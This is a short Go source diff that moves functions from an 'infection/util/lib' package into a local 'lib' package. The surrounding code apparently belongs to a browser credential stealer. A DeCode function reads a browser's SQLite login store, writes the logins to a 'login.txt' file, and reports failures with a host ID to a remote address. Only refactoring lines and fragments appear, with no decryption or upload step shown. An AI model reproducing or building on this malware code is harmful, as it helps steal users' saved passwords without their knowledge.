@@ -1,4 +1,4 @@
-package dew32
+package lib
 
 import (
 	"bufio"
@@ -6,8 +6,6 @@ import (
 	"encoding/json"
 	"fmt"
 	sqlite3 "github.com/ccpaging/go-sqlite3-windll"
-	"infection/browser"
-	"infection/util/lib"
 	"log"
 	"os"
 	"syscall"
@@ -34,9 +32,9 @@ type Login struct {
 }
 
 func DeCode(path string, addr string) {
-	err := lib.FileExits(path)
+	err := FileExits(path)
 	if err != nil {
-		lib.ErrorStatusCode(200, lib.HOSTID, addr+"browser_fail")
+		ErrorStatusCode(200, HOSTID, addr+"browser_fail")
 		return
 	}
 	log.Printf("Is Windows 64: %v\n", sqlite3.SQLiteWin64)
@@ -73,7 +71,7 @@ func DeCode(path string, addr string) {
 			}
 		}
 	}
-	f, ferr := os.Create(browser.Safe_path + "login.txt")
+	f, ferr := os.Create(BrowserSafepath + "login.txt")
 	if ferr != nil {
 		log.Println(ferr)
 	}
